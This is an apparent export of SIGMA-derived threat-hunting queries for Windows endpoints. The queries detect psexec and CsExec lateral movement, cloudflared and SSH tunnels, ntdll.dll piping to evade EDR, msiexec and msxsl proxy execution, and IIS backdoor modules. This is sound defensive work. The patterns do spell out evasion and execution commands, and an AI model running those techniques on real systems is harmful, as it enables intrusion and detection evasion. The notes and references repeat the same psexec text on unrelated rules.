            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\pubprn.vbs\" and tgt.process.cmdline contains \"script:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 885
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102",
                "t1090",
                "t1572"
            ],
            "name": "Cloudflared Tunnel Connections Cleanup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tunnel \" and tgt.process.cmdline contains \"cleanup \") and (tgt.process.cmdline contains \"-config \" or tgt.process.cmdline contains \"-connector-id \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 886
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587",
                "t1569"
            ],
            "name": "PUA - CsExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csexec.exe\" or tgt.process.displayName=\"csexec\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 887
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Process Launched Without Image Name",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 888
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "NtdllPipe Like Activity Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"type %windir%\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"type %systemroot%\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"type c:\\windows\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"\\ntdll.dll > \\\\.\\pipe\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 889
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "Potential RDP Tunneling Via SSH",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ssh.exe\" and tgt.process.cmdline contains \":3389\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 890
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of a ClickOnce deployment application",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Child Process Of ClickOnce Application",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\AppData\\Local\\Apps\\2.0\\\" and (tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\explorer.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\werfault.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 891
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"aspnet_compiler.exe\" which can be abused to compile and execute C# code.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "AspNetCompiler Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework\\\" or tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework64\\\") and tgt.process.image.path contains \"\\aspnet_compiler.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 892
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects inline execution of PowerShell code from a file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Powershell Inline Execution From A File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"Invoke-Expression \" or tgt.process.cmdline contains \"Invoke-Command \" or tgt.process.cmdline contains \"icm \") and (tgt.process.cmdline contains \"cat \" or tgt.process.cmdline contains \"get-content \" or tgt.process.cmdline contains \"type \") and tgt.process.cmdline contains \" -raw\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 893
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Suspicious Windows Feature Enabled - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Enable-WindowsOptionalFeature\" and tgt.process.cmdline contains \"-Online\" and tgt.process.cmdline contains \"-FeatureName\") and (tgt.process.cmdline contains \"TelnetServer\" or tgt.process.cmdline contains \"Internet-Explorer-Optional-amd64\" or tgt.process.cmdline contains \"TFTP\" or tgt.process.cmdline contains \"SMB1Protocol\" or tgt.process.cmdline contains \"Client-ProjFS\" or tgt.process.cmdline contains \"Microsoft-Windows-Subsystem-Linux\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 894
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when a possible suspicious driver is being installed via pnputil.exe lolbin",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Suspicious Driver Install by pnputil.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"-i\" or tgt.process.cmdline contains \"/install\" or tgt.process.cmdline contains \"-a\" or tgt.process.cmdline contains \"/add-driver\" or tgt.process.cmdline contains \".inf\") and tgt.process.image.path contains \"\\pnputil.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 895
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use Short Name Path in Command Line",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"~1\\\" or tgt.process.cmdline contains \"~2\\\") and (not ((src.process.image.path in (\"C:\\Windows\\System32\\Dism.exe\",\"C:\\Windows\\System32\\cleanmgr.exe\",\"C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe\")) or (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\" or src.process.image.path contains \"\\veam.backup.shell.exe\" or src.process.image.path contains \"\\winget.exe\" or src.process.image.path contains \"\\Everything\\Everything.exe\") or src.process.image.path contains \"\\AppData\\Local\\Temp\\WinGet\\\" or (tgt.process.cmdline contains \"\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe\" or tgt.process.cmdline contains \"C:\\Program Files\\Git\\post-install.bat\" or tgt.process.cmdline contains \"C:\\Program Files\\Git\\cmd\\scalar.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 896
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Simple Help Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\JWrapper-Remote Access\\\" or tgt.process.image.path contains \"\\JWrapper-Remote Support\\\") and tgt.process.image.path contains \"\\SimpleService.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 897
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Msiexec Execute Arbitrary DLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\msiexec.exe\" and (tgt.process.cmdline contains \" -y\" or tgt.process.cmdline contains \" /y\" or tgt.process.cmdline contains \" \u2013y\" or tgt.process.cmdline contains \" \u2014y\" or tgt.process.cmdline contains \" \u2015y\")) and (not (tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y C:\\Windows\\CCM\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 898
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed.\nThreat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Python Function Execution Security Warning Disabled In Excel",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Microsoft\\Office\\\" and tgt.process.cmdline contains \"\\Excel\\Security\" and tgt.process.cmdline contains \"PythonFunctionWarnings\") and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 899
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Suspicious IIS Module Registration",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\w3wp.exe\" and (tgt.process.cmdline contains \"appcmd.exe add module\" or (tgt.process.cmdline contains \" system.enterpriseservices.internal.publish\" and tgt.process.image.path contains \"\\powershell.exe\") or (tgt.process.cmdline contains \"gacutil\" and tgt.process.cmdline contains \" /I\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 900
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\nAdversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "Msxsl.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\msxsl.exe\")",
